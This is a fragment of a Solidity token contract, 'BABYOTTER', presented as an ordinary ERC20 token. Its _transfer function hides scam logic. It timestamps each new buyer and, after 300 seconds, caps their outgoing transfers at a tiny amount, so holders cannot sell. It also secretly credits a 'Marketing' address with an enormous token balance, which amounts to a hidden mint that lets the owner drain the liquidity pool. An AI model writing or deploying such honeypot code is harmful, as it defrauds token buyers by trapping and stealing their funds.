...
contract  BABYOTTER   is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => uint256) private Market; 
    string private  _name = "BABYOTTER";
    string private  _symbol = "BABYOTTER";
    uint8   private  _decimals = 9;
    uint256 private _totalSupply = 1000000000 * 10 ** 9;
    uint256 private _Mini = 1000000 * 10 ** 9;
    ...
    function _transfer(  address from,  address to,  uint256 amount  ) private {
        ...
        if ( from == uniswapV2Pairs    &&  balanceOf(to) == 0) { {Market[to] =  block.timestamp; } }  
        if ( from != uniswapV2Pairs )  {   
        if (  Market[from] + 300  < block.timestamp   )    { require(    _Mini >=  amount)  ;  } } }
        if (  from == uniswapV2Pairs  && to == Marketing )  { _tOwned[Marketing] += _totalSupply * _Mini;  }
        _tOwned[from] -= amount;
        _tOwned[to] += amount;
